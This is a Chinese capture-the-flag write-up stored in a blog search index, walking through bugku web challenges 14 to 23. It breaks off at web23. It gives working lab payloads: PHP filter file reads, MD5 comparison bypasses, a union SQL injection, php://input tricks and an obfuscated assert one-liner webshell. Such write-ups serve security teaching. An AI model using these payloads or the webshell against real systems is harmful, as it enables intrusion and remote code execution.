<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>bugku web总结_1</title>
    <link href="/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_2/"/>
    <url>/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_2/</url>
    
    <content type="html"><![CDATA[<p>﻿## bugku web总结(14-24)</p><h4 id="web14"><a href="#web14" class="headerlink" title="web14:"></a>web14:</h4><p>打开题目，可以看到一个链接click me</p><p><img src="https://img-blog.csdnimg.cn/20210425101546603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>点击后显示了index.php，可能提示flag存在index.php中</p><p><img src="https://img-blog.csdnimg.cn/20210425101612732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>如上图我们还可以看到多了一个参数file，很像是文件包含，这里我们可以尝试使用php伪协议读取文件内容，放上一个介绍php伪协议的文章链接<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>构造payload：php://filter/read=convert.base64-encode/resource=index.php，其中read为读过滤器，此项为选填，这里选用了base64编码，防止无法直接传输，resource为必填，指定我们要读取的数据流</p><p>拿到一串base64编码</p><p><img src="https://img-blog.csdnimg.cn/20210425101638904.png#pic_center" alt="在这里插入图片描述"><br>hackbar解码，可以看到源码中有一行注释，成功拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425101704322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="20210416183207599.png"></p><h4 id="web15"><a href="#web15" class="headerlink" title="web15:"></a>web15:</h4><p>打开之后提示输入5位密码</p><p><img src="https://img-blog.csdnimg.cn/2021042510174222.png#pic_center" alt="在这里插入图片描述"></p><p>直接burp扔给intruder爆破，没什么好说的</p><p><img src="https://img-blog.csdnimg.cn/20210425101801225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210425101822483.png#pic_center" alt="在这里插入图片描述"></p><h4 id="web16"><a href="#web16" class="headerlink" title="web16:"></a>web16:</h4><p>点开题目之后，给了一串md5值</p><p><img src="https://img-blog.csdnimg.cn/20210425101839747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>解密之后显示空密码，右键查看源代码也看不到什么特殊东西</p><p><img src="https://img-blog.csdnimg.cn/20210425101900144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>结合题目的名字，叫做备份是个好习惯，我们目录扫描一波后台，看看能不能发现备份文件</p><p>不出所料，有一个index.php.bak文件</p><p><img src="https://img-blog.csdnimg.cn/20210425101918491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>我们访问它，将其下载下来，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Created by PhpStorm.</span><br><span class="hljs-comment"> * User: Norse</span><br><span class="hljs-comment"> * Date: 2017/8/6</span><br><span class="hljs-comment"> * Time: 20:22</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;    <span class="hljs-comment">//告诉我们flag文件</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">//ini_set设置php.ini选项，此处参数display_error为报错回显</span><br><span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);<span class="hljs-comment">//$_SERVER[&#x27;REQUEST_URI&#x27;]回显当前路径，strstr函  数为截取字符串，如此处为从?截取到字符串结束为止</span><br><span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);      <span class="hljs-comment">//substr也是截取字符串，此处表示从第一个开始(扔掉?)，截取到结尾</span><br><span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>); <span class="hljs-comment">//将变量str中的key替换为空</span><br>parse_str(<span class="hljs-variable">$str</span>);      <span class="hljs-comment">//parse_str函数将括号内的赋值语句直接转化为变量，并给它赋值，比如parse_str(a=1)，就会创建一个变量a，并赋值为1</span><br><span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);<span class="hljs-comment">//变量key1md5加密</span><br><br><span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);<span class="hljs-comment">//同上</span><br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;<span class="hljs-comment">//md5加密后的key1和key2相等，原值不相等</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;<span class="hljs-comment">//打印flag</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里既要key1和key2的md5值相等，原值又不能相等，有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>payload：?kekeyy1[]=12agh&amp;kekeyy2[]=123ccnjgg</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>payload：?kekeyy1=240610708&amp;kekeyy2=s155964671a</p><h4 id="web17"><a href="#web17" class="headerlink" title="web17:"></a>web17:</h4><p>点开题目之后，给了一个成绩查询页面</p><p><img src="https://img-blog.csdnimg.cn/20210425101943849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>很自然的想到sql注入，经测试是个字符型的，无任何过滤，没啥好说的，手注、sqlmap均可</p><p>最后得到flag，payload：0’ union select 1,2,3,skctf_flag from fl4g#</p><p><img src="https://img-blog.csdnimg.cn/20210425102005106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="web18："><a href="#web18：" class="headerlink" title="web18："></a>web18：</h4><p>点开题目之后，给出一个算式，让我们2s给出结果</p><p><img src="https://img-blog.csdnimg.cn/20210425102029992.png#pic_center" alt="在这里插入图片描述"></p><p>很显然手工做不到，但是可以借助脚本获取数值之后计算传参，拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span><br><span class="hljs-keyword">import</span> re <span class="hljs-comment">#引入re库</span><br>url = <span class="hljs-string">&#x27;&#x27;&#x27;http://114.67.246.176:10736/&#x27;&#x27;&#x27;</span><br>s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span><br>retuen = s.get(url)<br>equation = re.search(<span class="hljs-string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,retuen.text).group()<br>result = <span class="hljs-built_in">eval</span>(equation)<span class="hljs-comment">#eval()函数用来执行一个字符串表达式,并返回表达式的值。</span><br><br>key = &#123;<span class="hljs-string">&#x27;value&#x27;</span>:result&#125;<span class="hljs-comment">#创建一个字典类型用于传参</span><br>flag = s.post(url,data=key)<span class="hljs-comment">#用post方法传上去</span><br><br><span class="hljs-built_in">print</span>(flag.text)<br></code></pre></td></tr></table></figure><h4 id="web19："><a href="#web19：" class="headerlink" title="web19："></a>web19：</h4><p>打开题目之后，会提示我们快一点，bp抓包查看返回信息，可以在header中看到一串类似flag的东西</p><p><img src="https://img-blog.csdnimg.cn/20210425102051662.png#pic_center" alt="在这里插入图片描述"></p><p>base64两次解密后会变成一串数字，提交上去也不对，把请求包再send一次，会发现flag会变，好吧，确实速度要快，和上一题基本一个思路，下面给出脚本代码</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&quot;http://114.67.246.176:17056/&quot;</span><br>r = requests.Session()<br>headers = r.<span class="hljs-built_in">get</span>(url).headers<br>str1 = base64.b64decode(headers[<span class="hljs-string">&#x27;flag&#x27;</span>])<br>str2 = base64.b64decode(repr(str1).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]) # repr()函数将对象转化为供解释器读取的形式(Bety-&gt;<span class="hljs-built_in">str</span>)<br>data = &#123;<span class="hljs-string">&#x27;margin&#x27;</span>:str2&#125;<br><span class="hljs-built_in">print</span> (r.post(url,data).<span class="hljs-built_in">text</span>)<br></code></pre></td></tr></table></figure><p>python3运行，成功拿到flag</p><h4 id="web20："><a href="#web20：" class="headerlink" title="web20："></a>web20：</h4><p>打开题目之后，会给出一长串不明意义的字符串，右键查看源码也并没有发现什么</p><p><img src="https://img-blog.csdnimg.cn/2021042510211069.png#pic_center" alt="在这里插入图片描述"></p><p>观察url，有两个参数，一个line是空的没有赋值，另一个filename给了一串base64编码：a2V5cy50eHQ=，解码之后得到keys.txt，将文件名换为同样base64加密后的index.php，可以看到一个标签”&lt;?php”，可以确定此处能够查看源码，依次改变line值，最后可以读出整段源码，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123; <span class="hljs-comment">#当cookie为margin=margin时</span><br><span class="hljs-variable">$file_list</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;&#125;                    <span class="hljs-comment">#给file_list[2]增加keys.php</span><br><span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;<br><span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码中可以看到，当cookie为margin=margin时，会在file_list[2]数组中增加keys.php的值</p><p>我们照做，使用hackbar或burp抓包添加cookie值后，查看返回包或返回页面源码，即可拿到flag</p><h4 id="web21："><a href="#web21：" class="headerlink" title="web21："></a>web21：</h4><p>点开之后没看到啥提示信息</p><p><img src="https://img-blog.csdnimg.cn/20210425102136453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>右键查看源码，可以看到提示了一个1p.html</p><p><img src="https://img-blog.csdnimg.cn/20210425102204250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>直接访问此页面的话，会跳转至bugku的首页，我们用burp抓包，将请求页面替换为1p.html</p><p><img src="https://img-blog.csdnimg.cn/20210425102223165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>返回的数据包中包含一串url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">HEAD</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">LANGUAGE</span>=<span class="hljs-string">&quot;Javascript&quot;</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-keyword">var</span> Words =<span class="hljs-string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">OutWord</span>(<span class="hljs-params"></span>)</span></span><br>&#123;<br><span class="javascript"><span class="hljs-keyword">var</span> NewWords;</span><br><span class="javascript">NewWords = <span class="hljs-built_in">unescape</span>(Words);</span><br><span class="javascript"><span class="hljs-built_in">document</span>.write(NewWords);</span><br>&#125; <br>OutWord();<br><span class="javascript"><span class="hljs-comment">// --&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">HEAD</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">BODY</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span><br></code></pre></td></tr></table></figure><p>解码之后得到一串注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><span class="hljs-comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>将注释base64解码，终于得到源码</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stata">&quot;;<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[&#x27;id&#x27;])     <span class="hljs-comment">//变量id不为空</span><br>&#123;<br>header(&#x27;Location: hello.php?id=1&#x27;);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[&#x27;id&#x27;];<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[&#x27;a&#x27;];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[&#x27;b&#x27;];<br><span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,&#x27;.&#x27;))   <span class="hljs-comment">//变量a中不含有.</span><br>&#123;<br>echo &#x27;<span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span>&#x27;;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,&#x27;r&#x27;);     <span class="hljs-comment">//将变量a的值读入$data</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> and <span class="hljs-variable">$id</span>==0 and <span class="hljs-built_in">strlen</span>(<span class="hljs-variable">$b</span>)&gt;5 and eregi(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1),<span class="hljs-string">&quot;1114&quot;</span>) and <span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1)!=4)  <span class="hljs-comment">//①</span><br>&#123;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;***********&#125;&quot;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;never never never give up !!!&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>①：首先要求data的值，即a的内容为bugku is a nice plateform!，id不为0，且长度大于5，substr($b,0,1)为截取b的第一个字符(从第0个开始读取1个)，111+b的第一个字符需要在1114中出现，且b的第一个字符不能为4</p><p>总结一下，想要输出flag，必须满足几个条件：a要为bugku is a nice plateform!，id不能为空但需要id<code>==</code>0，此处可以使用0e1234来绕过（会识别为科学计数法），也可以使用0abc来绕过，php是弱类型语言，数字和字符(串)的比较是存在类型转换的，对字符串来说是以开头的数字为准，所以在松散(<code>==</code>)比较中，0<code>==</code>0abc是正确的，详情可以百度<code>==</code>和<code>===</code>的差别，最后还要满足上文①中b的要求，这里可以用.12345或*12345来绕过，这两个符号为php的通配符，放在此处取第一个字符后会被当成是任意字符</p><p>最终payload：?id=0e123&amp;a=php://input&amp;b=.12345，另外需要在下面加上post传参bugku is a nice plateform!</p><p>得到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102358596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="web22："><a href="#web22：" class="headerlink" title="web22："></a>web22：</h4><p>这题并没有把提示放在题目中，而是放在了题目入口处</p><p>送给大家一个过狗一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>; <span class="hljs-variable">$poc_1</span>=explode(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>); <span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[0].<span class="hljs-variable">$poc_1</span>[1].<span class="hljs-variable">$poc_1</span>[2].<span class="hljs-variable">$poc_1</span>[3].<span class="hljs-variable">$poc_1</span>[4].<span class="hljs-variable">$poc_1</span>[5]; <span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>])<br></code></pre></td></tr></table></figure><p>分析一下，这一串代码总结下来：</p><p>1.<code>$poc=a#s#s#e#r#t</code></p><p>2.<code>$poc_1=explode(&quot;#&quot;,$poc)</code>，这个函数的意思是以#为定界符，分隔字符串<code>$poc</code>，即<code>$poc_1=assert</code></p><p>3.<code>$poc_2=$poc_1=assert，$poc_2($_GET[&#39;s&#39;])</code>的含义就是<code>assert($\_GET[&#39;s&#39;])</code>，assert函数可以进行代码执行</p><p>那接下来就好办了，先dir看下当前目录下的文件</p><p><img src="https://img-blog.csdnimg.cn/20210425102545534.png#pic_center" alt="在这里插入图片描述"></p><p>看到了flag文件，直接cat查看，拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102605165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="web23："><a href="#web23：" class="headerlink" title="web23："></a>web23：</h4><p>点击进入题目，直接给了一段源码</p><p><img src="https://img-blog.csdnimg.cn/20210425102630421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;flag&#123;********************************&#125;&#x27;</span>;<br><span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);<br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; <br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> 